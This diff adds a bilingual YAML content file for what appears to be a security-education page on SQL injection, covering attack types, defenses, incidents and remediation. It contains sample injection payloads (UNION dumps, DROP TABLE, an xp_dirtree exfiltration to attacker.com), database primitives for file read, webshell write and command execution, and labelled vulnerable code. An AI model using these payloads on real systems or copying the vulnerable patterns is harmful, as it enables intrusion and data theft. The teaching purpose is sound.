@@ -1,0 +1,570 @@
+meta:
+  id: sqli
+  threatId: "1.1"
+  severity: Critical
+  color: "#ef4444"
+  colorRgb: 239,68,68
+  cwe: CWE-89
+  cvss: "9.8"
+  standard: OWASP A03:2021
+hero:
+  titleMain: SQL
+  titleGrad: Injection
+  titleTail: ""
+  topbar: SQL Injection
+  lead:
+    en: "SQL Injection lets an attacker alter the structure of a database query by smuggling syntax through unsanitized input — turning a data field into executable SQL. It remains one of the highest-impact web vulnerabilities: a single injectable parameter can expose every record in the database, and in the worst case lead to full remote code execution on the server."
+    pl: "SQL Injection pozwala atakującemu zmienić strukturę zapytania do bazy, przemycając składnię przez niesanityzowane wejście — zamieniając pole danych w wykonywalny SQL. To wciąż jedna z najgroźniejszych podatności webowych: pojedynczy podatny parametr może odsłonić każdy rekord w bazie, a w skrajnym przypadku prowadzić do pełnego zdalnego wykonania kodu na serwerze."
+  metrics:
+    - k: CWE-89
+      v:
+        en: Weakness ID
+        pl: ID słabości
+    - k: "9.8"
+      v: CVSS · Critical
+    - k: A03:2021
+      v: OWASP Top 10
+    - k: "9"
+      v:
+        en: Attack variants
+        pl: Warianty ataku
+  sources:
+    - label: OWASP A03:2021
+      url: https://owasp.org/Top10/A03_2021-Injection/
+    - label: CWE-89 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/89.html
+    - label: OWASP Prevention Cheat Sheet
+      url: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+    - label: NIST NVD
+      url: https://nvd.nist.gov/vuln/search/results?query=sql+injection&search_type=all
+    - label: PortSwigger Academy
+      url: https://portswigger.net/web-security/sql-injection
+sectionOrder:
+  - overview
+  - types
+  - cheatsheet
+  - code
+  - orm
+  - method
+  - defense
+  - incidents
+  - tools
+  - compliance
+  - ir
+  - migration
+nav:
+  - id: overview
+    en: Overview
+    pl: Przegląd
+  - id: types
+    en: Attack types
+    pl: Typy ataków
+  - id: cheatsheet
+    en: DB cheatsheet
+    pl: Ściąga DB
+  - id: code
+    en: Vuln vs Secure
+    pl: Podatny vs Bezpieczny
+  - id: orm
+    en: ORM false safety
+    pl: Fałszywe bezpieczeństwo ORM
+  - id: method
+    en: Methodology
+    pl: Metodyka
+  - id: defense
+    en: Defense layers
+    pl: Warstwy obrony
+  - id: incidents
+    en: Real incidents
+    pl: Incydenty
+  - id: tools
+    en: SAST / DAST
+    pl: SAST / DAST
+  - id: compliance
+    en: Compliance
+    pl: Zgodność
+  - id: ir
+    en: Incident response
+    pl: Reagowanie
+  - id: migration
+    en: Legacy migration
+    pl: Migracja legacy
+sections:
+  attacks:
+    title:
+      en: Attack types
+      pl: Typy ataków
+    lead:
+      en: Nine distinct ways the same root cause manifests — from noisy UNION dumps to silent time-based inference.
+      pl: Dziewięć sposobów, w jakie ta sama przyczyna się ujawnia — od głośnych zrzutów UNION po ciche wnioskowanie czasowe.
+    items:
+      - name: Union-based
+        sev: high
+        description:
+          en: Appends a UNION SELECT to merge attacker-controlled rows into the result set. Requires matching column count and compatible types.
+          pl: Dokleja UNION SELECT, by wstrzyknąć wiersze atakującego do wyniku. Wymaga zgodnej liczby kolumn i typów.
+        payload: "' UNION SELECT username, password, NULL FROM users-- -"
+      - name: Boolean blind
+        sev: high
+        description:
+          en: No data returned — the app reveals truth of a condition via page differences. Data is extracted one bit at a time.
+          pl: Brak danych w odpowiedzi — aplikacja zdradza prawdziwość warunku różnicą w odpowiedzi. Dane wyciągane bit po bicie.
+        payload: "' AND SUBSTRING(password,1,1)='a'-- -"
+      - name: Time-based blind
+        sev: high
+        description:
+          en: No visible difference at all — inference is made from response delays triggered by conditional sleeps.
+          pl: Brak widocznej różnicy — wnioskowanie z opóźnień odpowiedzi wywołanych warunkowym uśpieniem.
+        payload: "'; IF(1=1) WAITFOR DELAY '0:0:5'-- -"
+      - name: Error-based
+        sev: high
+        description:
+          en: Forces the database to emit error messages that leak data through verbose diagnostics (e.g. EXTRACTVALUE, CAST).
+          pl: Wymusza komunikaty błędów DB, które wyciekają dane przez szczegółowe diagnostyki (np. EXTRACTVALUE, CAST).
+        payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -"
+      - name: Second-order (stored)
+        sev: critical
+        description:
+          en: Payload is stored safely on insert, then executed later when re-used in a raw query. Missed by both SAST and DAST.
+          pl: Ładunek zapisywany bezpiecznie, potem wykonywany przy ponownym użyciu w surowym zapytaniu. Pomijany przez SAST i DAST.
+        payload: admin'-- -   (stored as username, weaponized on profile update)
+      - name: Out-of-band (OOB)
+        sev: high
+        description:
+          en: Exfiltrates data over a side channel (DNS/HTTP) when responses are not visible — UTL_HTTP, xp_dirtree, LOAD_FILE.
+          pl: Eksfiltruje dane kanałem bocznym (DNS/HTTP) gdy odpowiedź jest niewidoczna — UTL_HTTP, xp_dirtree, LOAD_FILE.
+        payload: "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'-- -"
+      - name: Stacked queries
+        sev: critical
+        description:
+          en: Terminates the original statement and runs a second one — enables INSERT/DROP and command execution where the driver allows it.
+          pl: Kończy oryginalne zapytanie i uruchamia drugie — pozwala na INSERT/DROP i wykonanie poleceń, gdy sterownik na to pozwala.
+        payload: "'; DROP TABLE audit_log;-- -"
+      - name: ORDER BY injection
+        sev: medium
+        description:
+          en: Sort parameters cannot be parameterized as values — column index/name injected into ORDER BY enables enumeration.
+          pl: Parametry sortowania nie mogą być parametryzowane jako wartości — indeks/nazwa kolumny w ORDER BY pozwala na enumerację.
+        payload: ORDER BY (CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)
+      - name: INSERT / UPDATE / DELETE
+        sev: high
+        description:
+          en: Injection in write statements lets attackers tamper with stored data or subqueries inside VALUES / SET clauses.
+          pl: Wstrzyknięcie w zapytania zapisu pozwala manipulować danymi lub podzapytaniami w VALUES / SET.
+        payload: "', (SELECT password FROM users WHERE id=1))-- -"
+  cheatsheet:
+    title:
+      en: DB-specific cheatsheet
+      pl: Ściąga per baza
+    lead:
+      en: Fingerprinting and exploitation primitives differ per engine. Confirmed across MySQL, PostgreSQL, MSSQL, Oracle, and SQLite.
+      pl: Prymitywy identyfikacji i eksploatacji różnią się per silnik. Potwierdzone dla MySQL, PostgreSQL, MSSQL, Oracle i SQLite.
+    groups:
+      - name: MySQL
+        rows:
+          - - Sleep
+            - SLEEP(5)
+          - - Concat
+            - GROUP_CONCAT(col SEPARATOR 0x3a)
+          - - Comment
+            - "-- -  /  #  /  /**/"
+          - - Version
+            - "@@version"
+          - - File read
+            - LOAD_FILE('/etc/passwd')
+          - - File write
+            - INTO OUTFILE '/var/www/sh.php'
+      - name: PostgreSQL
+        rows:
+          - - Sleep
+            - pg_sleep(5)
+          - - Concat
+            - string_agg(col, ',')
+          - - Comment
+            - "-- -  /  /**/"
+          - - Version
+            - version()
+          - - File read
+            - pg_read_file('/etc/passwd')
+          - - RCE
+            - COPY t FROM PROGRAM 'id'
+      - name: MSSQL
+        rows:
+          - - Sleep
+            - WAITFOR DELAY '0:0:5'
+          - - Concat
+            - (SELECT col+',' FOR XML PATH(''))
+          - - Comment
+            - "-- -  /  /**/"
+          - - Version
+            - "@@version"
+          - - RCE
+            - EXEC xp_cmdshell 'whoami'
+          - - OOB
+            - xp_dirtree '\\host\s'
+      - name: Oracle
+        rows:
+          - - Sleep
+            - DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)
+          - - Concat
+            - LISTAGG(col,',')
+          - - Comment
+            - "-- -  /  /**/"
+          - - Version
+            - SELECT banner FROM v$version
+          - - Required
+            - FROM DUAL (single-row)
+          - - OOB
+            - UTL_HTTP.REQUEST(...)
+      - name: SQLite
+        rows:
+          - - Sleep
+            - — (no native sleep)
+          - - Concat
+            - group_concat(col, ':')
+          - - Comment
+            - "-- -  /  /**/"
+          - - Version
+            - sqlite_version()
+          - - RCE
+            - load_extension('evil.so')
+          - - Attach
+            - ATTACH DATABASE 'x.db' AS x
+  code:
+    title:
+      en: Vulnerable vs Secure
+      pl: Podatny vs Bezpieczny
+    lead:
+      en: "The same fix in five languages: stop building SQL strings, start binding parameters."
+      pl: "Ta sama naprawa w pięciu językach: przestań sklejać stringi SQL, zacznij wiązać parametry."
+    languages:
+      - label: Python
+        lang: python
+        vulnerable: |-
+          # VULNERABLE — string interpolation puts user input into the query text
+          cursor.execute("SELECT * FROM users WHERE id = " + user_id)
+          cursor.execute(f"SELECT * FROM users WHERE name = '{name}'")
+        safe: |-
+          # SECURE — parameterized query; driver sends data separately from SQL
+          cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
+          cursor.execute("SELECT * FROM users WHERE name = %s", (name,))
+      - label: JavaScript
+        lang: javascript
+        vulnerable: |-
+          // VULNERABLE — template literal concatenates input into the SQL string
+          const q = `SELECT * FROM users WHERE email = '${email}'`;
+          db.query(q);
+        safe: |-
+          // SECURE — placeholders; node-postgres / mysql2 bind values
+          db.query('SELECT * FROM users WHERE email = $1', [email]);
+          connection.execute('SELECT * FROM users WHERE email = ?', [email]);
+      - label: PHP
+        lang: php
+        vulnerable: |-
+          <?php // VULNERABLE — input concatenated directly into the query
+          $sql = "SELECT * FROM users WHERE id = " . $_GET['id'];
+          $result = mysqli_query($conn, $sql);
+        safe: |-
+          <?php // SECURE — PDO prepared statement with bound parameter
+          $stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
+          $stmt->execute(['id' => $_GET['id']]);
+      - label: Java
+        lang: java
+        vulnerable: |-
+          // VULNERABLE — Statement with concatenated input
+          Statement st = conn.createStatement();
+          ResultSet rs = st.executeQuery(
+              "SELECT * FROM users WHERE name = '" + name + "'");
+        safe: |-
+          // SECURE — PreparedStatement with bound parameter
+          PreparedStatement ps = conn.prepareStatement(
+              "SELECT * FROM users WHERE name = ?");
+          ps.setString(1, name);
+          ResultSet rs = ps.executeQuery();
+      - label: Go
+        lang: go
+        vulnerable: |-
+          // VULNERABLE — fmt.Sprintf builds the query from user input
+          q := fmt.Sprintf("SELECT * FROM users WHERE id = %s", id)
+          rows, _ := db.Query(q)
+        safe: |-
+          // SECURE — placeholder; database/sql binds the argument
+          rows, err := db.Query("SELECT * FROM users WHERE id = $1", id)
+  orm:
+    title:
+      en: ORM false safety
+      pl: Fałszywe bezpieczeństwo ORM
+    lead:
+      en: ORMs are safe by default — until you reach for the raw escape hatch. These APIs bypass automatic parameter binding.
+      pl: ORM są domyślnie bezpieczne — dopóki nie sięgniesz po surową furtkę. Te API omijają automatyczne wiązanie parametrów.
+    rows:
+      - fw: Django
+        api: .raw() / .extra()
+        note:
+          en: Raw SQL bypasses the ORM's automatic escaping. Use params= argument.
+          pl: Surowy SQL omija auto-escaping ORM. Użyj argumentu params=.
+      - fw: SQLAlchemy
+        api: text() / literal_column()
+        note:
+          en: text() with f-strings is injectable. Bind with :param and .params().
+          pl: text() z f-stringami jest podatny. Wiąż przez :param i .params().
+      - fw: Hibernate
+        api: createNativeQuery()
+        note:
+          en: Native queries skip HQL parameter binding. Use setParameter().
+          pl: Zapytania natywne pomijają wiązanie HQL. Użyj setParameter().
+      - fw: Sequelize
+        api: "literal() / { raw: true }"
+        note:
+          en: literal() injects raw SQL fragments. Use replacements / bind.
+          pl: literal() wstrzykuje surowe fragmenty SQL. Użyj replacements / bind.
+  method:
+    title:
+      en: Attack methodology
+      pl: Metodyka ataku
+    lead:
+      en: How an attacker progresses from a hunch to full compromise.
+      pl: Jak atakujący przechodzi od przeczucia do pełnej kompromitacji.
+    steps:
+      - title:
+          en: Detect
+          pl: Wykrycie
+        description:
+          en: Single quote, boolean pairs (1=1 / 1=2), and time delays reveal an injectable parameter.
+          pl: Apostrof, pary boolowskie (1=1 / 1=2) i opóźnienia czasowe ujawniają podatny parametr.
+      - title:
+          en: Fingerprint
+          pl: Identyfikacja
+        description:
+          en: Error messages, function behavior, and comment syntax identify the DBMS.
+          pl: Komunikaty błędów, zachowanie funkcji i składnia komentarzy wskazują DBMS.
+      - title:
+          en: Enumerate
+          pl: Enumeracja
+        description:
+          en: ORDER BY → column count, UNION NULL technique, then information_schema for the schema.
+          pl: ORDER BY → liczba kolumn, technika UNION NULL, potem information_schema dla schematu.
+      - title:
+          en: Extract
+          pl: Ekstrakcja
+        description:
+          en: Pull credentials, schema, and sensitive data via UNION or blind inference.
+          pl: Wyciągnięcie poświadczeń, schematu i wrażliwych danych przez UNION lub blind.
+      - title:
+          en: Escalate
+          pl: Eskalacja
+        description:
+          en: File read/write → webshell → RCE via xp_cmdshell / COPY TO PROGRAM.
+          pl: Odczyt/zapis plików → webshell → RCE przez xp_cmdshell / COPY TO PROGRAM.
+  defenses:
+    title:
+      en: Defense layers, ranked
+      pl: Warstwy obrony wg skuteczności
+    lead:
+      en: Defense in depth — but not all layers are equal. Parameterization is the fix; everything else reduces blast radius.
+      pl: Obrona w głąb — ale warstwy nie są równe. Parametryzacja to naprawa; reszta ogranicza skutki.
+    items:
+      - rank: 1
+        eff: 100
+        kind: primary
+        label:
+          en: Parameterized queries
+          pl: Zapytania parametryzowane
+        note:
+          en: Structural fix — separates code from data. The only complete defense.
+          pl: Naprawa strukturalna — oddziela kod od danych. Jedyna pełna obrona.
+      - rank: 2
+        eff: 85
+        kind: strong
+        label:
+          en: ORM with safe APIs
+          pl: ORM z bezpiecznym API
+        note:
+          en: Default query builders are safe; avoid raw()/text()/native escapes.
+          pl: Domyślne buildery są bezpieczne; unikaj raw()/text()/natywnych.
+      - rank: 3
+        eff: 70
+        kind: strong
+        label:
+          en: Allow-list input validation
+          pl: Walidacja wejścia (allow-list)
+        note:
+          en: Essential for non-parameterizable parts (ORDER BY, table names).
+          pl: Niezbędna dla niemożliwych do parametryzacji części (ORDER BY, nazwy tabel).
+      - rank: 4
+        eff: 50
+        kind: mitigation
+        label:
+          en: Least-privilege DB account
+          pl: Konto DB o min. uprawnieniach
+        note:
+          en: Limits blast radius — no FILE, no DDL, no xp_cmdshell.
+          pl: Ogranicza skutki — bez FILE, DDL, xp_cmdshell.
+      - rank: 5
+        eff: 30
+        kind: mitigation
+        label:
+          en: Stored procedures
+          pl: Procedury składowane
+        note:
+          en: Only safe if they themselves use bound parameters internally.
+          pl: Bezpieczne tylko gdy same używają wiązanych parametrów.
+      - rank: 6
+        eff: 20
+        kind: weak
+        label:
+          en: WAF (compensating only)
+          pl: WAF (tylko kompensacyjny)
+        note:
+          en: Bypassable via encoding/comments. Never a primary control.
+          pl: Omijalny przez kodowanie/komentarze. Nigdy nie jako główna kontrola.
+  incidents:
+    title:
+      en: Real-world incidents
+      pl: Rzeczywiste incydenty
+    lead:
+      en: SQLi is not theoretical — these breaches cost hundreds of millions and exposed billions of records.
+      pl: SQLi nie jest teoretyczne — te wycieki kosztowały setki milionów i odsłoniły miliardy rekordów.
+    items:
+      - org: Heartland Payment Systems
+        year: 2008
+        impact: 134M card records
+        cost: $140M
+        description:
+          en: SQLi gave initial foothold into the payment processor network.
+          pl: SQLi dało pierwszy przyczółek w sieci procesora płatności.
+      - org: Sony PlayStation Network
+        year: 2011
+        impact: 77M accounts
+        cost: Plaintext passwords
+        description:
+          en: Massive breach with credentials stored without proper hashing.
+          pl: Ogromny wyciek z poświadczeniami bez właściwego hashowania.
+      - org: Yahoo Voices
+        year: 2012
+        impact: 450K credentials
+        cost: Public dump
+        description:
+          en: Union-based SQLi dumped plaintext credentials publicly.
+          pl: Union-based SQLi opublikowało poświadczenia w jawnej formie.
+      - org: TalkTalk
+        year: 2015
+        impact: 157K customers
+        cost: £400K fine
+        description:
+          en: Basic SQLi exploited by teenagers; record ICO fine at the time.
+          pl: Podstawowy SQLi wykorzystany przez nastolatków; rekordowa kara ICO.
+    inlineSources:
+      - label: Heartland (DOJ)
+        url: https://www.justice.gov/usao-nj/pr/payment-processor-hacker-sentenced-20-years-prison
+      - label: FTC enforcement
+        url: https://www.ftc.gov/news-events/news/press-releases/2014/08/ftc-files-complaint-against-wyndham-hotels
+      - label: TalkTalk (ICO)
+        url: https://ico.org.uk/about-the-ico/media-centre/news-and-blogs/2016/10/talktalk-gets-record-400-000-fine-for-failing-to-prevent-october-2015-attack/
+      - label: Yahoo CVE-2012
+        url: https://nvd.nist.gov/vuln/detail/CVE-2012-3414
+  tools:
+    title:
+      en: Detection tooling
+      pl: Narzędzia wykrywania
+    lead:
+      en: Static analysis catches concatenation patterns; dynamic analysis confirms exploitability. Use both.
+      pl: Analiza statyczna łapie konkatenację; dynamiczna potwierdza eksploatowalność. Używaj obu.
+    sast:
+      - - Semgrep
+        - p/sql-injection ruleset, fast CI gate
+      - - Bandit
+        - B608 — hardcoded SQL string building (Python)
+      - - CodeQL
+        - Dataflow taint tracking, multi-language
+      - - SpotBugs + FindSecBugs
+        - JVM bytecode SQLi detectors
+    dast:
+      - - SQLmap
+        - Automated detection & exploitation, authenticated mode
+      - - Burp Suite Pro
+        - Active scanner + manual repeater/intruder
+      - - OWASP ZAP
+        - Open-source active scan + fuzzing
+    note:
+      en: <strong>Blind spot:</strong> second-order (stored) SQLi is missed by both SAST and DAST — it requires manual code review of where stored values are later re-used in queries.
+      pl: <strong>Martwy punkt:</strong> second-order (stored) SQLi jest pomijany przez SAST i DAST — wymaga ręcznego przeglądu kodu tam, gdzie zapisane wartości są później użyte w zapytaniach.
+  compliance:
+    title:
+      en: Compliance quick-reference
+      pl: Szybka zgodność
+    lead:
+      en: Where SQLi prevention maps onto the controls auditors check.
+      pl: Gdzie zapobieganie SQLi mapuje się na kontrole sprawdzane przez audytorów.
+    items:
+      - std: PCI DSS
+        items:
+          - 6.2.4 — secure coding vs injection
+          - 6.3.2 — review custom code
+          - 11.3 — penetration testing
+      - std: GDPR
+        items:
+          - Art. 25 — security by design
+          - Art. 32 — appropriate measures
+          - Art. 33/34 — 72h breach notification
+      - std: SOC 2
+        items:
+          - CC6.1 — logical access controls
+          - CC7.1 — vulnerability detection
+    inlineSources:
+      - label: PCI DSS v4.0
+        url: https://www.pcisecuritystandards.org/document_library/
+      - label: GDPR Art. 32
+        url: https://gdpr-info.eu/art-32-gdpr/
+      - label: GDPR Art. 33
+        url: https://gdpr-info.eu/art-33-gdpr/
+      - label: SOC 2 (AICPA)
+        url: https://www.aicpa.org/resources/article/soc-2-reporting-on-an-examination-of-controls-at-a-service-organization-relevant-to-security
+  ir:
+    title:
+      en: Incident response checklist
+      pl: Lista kontrolna reagowania
+    lead:
+      en: If you confirm an active SQLi breach, work this list top to bottom.
+      pl: Po potwierdzeniu aktywnego wycieku SQLi przejdź tę listę od góry.
+    steps:
+      - en: Isolate the affected system / endpoint from the network
+        pl: Odizoluj dotknięty system / endpoint od sieci
+      - en: Preserve database & application logs (do not wipe)
+        pl: Zabezpiecz logi bazy i aplikacji (nie usuwaj)
+      - en: Rotate database credentials and API keys
+        pl: Zrotuj poświadczenia DB i klucze API
+      - en: Assess scope — which tables / records were accessed
+        pl: Oceń zakres — które tabele / rekordy zostały odczytane
+      - en: "Patch: parameterize the vulnerable query, redeploy"
+        pl: "Załataj: sparametryzuj podatne zapytanie, wdróż ponownie"
+      - en: Notify regulators within 72h (GDPR) and affected users
+        pl: Powiadom regulatorów w 72h (GDPR) i dotkniętych użytkowników
+      - en: "Post-incident: SAST/DAST sweep for sibling vulnerabilities"
+        pl: "Po incydencie: przegląd SAST/DAST pod kątem bliźniaczych podatności"
+  migration:
+    title:
+      en: Legacy migration strategy
+      pl: Strategia migracji legacy
+    lead:
+      en: Three phases to retire string-concatenation SQL from an existing codebase without a big-bang rewrite.
+      pl: Trzy fazy, by wycofać SQL z konkatenacji bez ryzykownego przepisania na raz.
+    steps:
+      - title:
+          en: 1 · Inventory
+          pl: 1 · Inwentaryzacja
+        description:
+          en: SAST scan (Semgrep / Bandit) to catalogue every raw string-concat SQL statement.
+          pl: Skan SAST (Semgrep / Bandit), by skatalogować każde surowe zapytanie z konkatenacją.
+      - title:
+          en: 2 · Parameterize
+          pl: 2 · Parametryzacja
+        description:
+          en: "Incremental rewrite, highest-risk endpoints first: login, search, payment."
+          pl: "Stopniowa przebudowa, najpierw najwyższe ryzyko: login, wyszukiwarka, płatności."
+      - title:
+          en: 3 · Validate
+          pl: 3 · Walidacja
+        description:
+          en: DAST with SQLmap in authenticated mode per endpoint to confirm the fix.
+          pl: DAST z SQLmap w trybie uwierzytelnionym per endpoint, by potwierdzić naprawę.
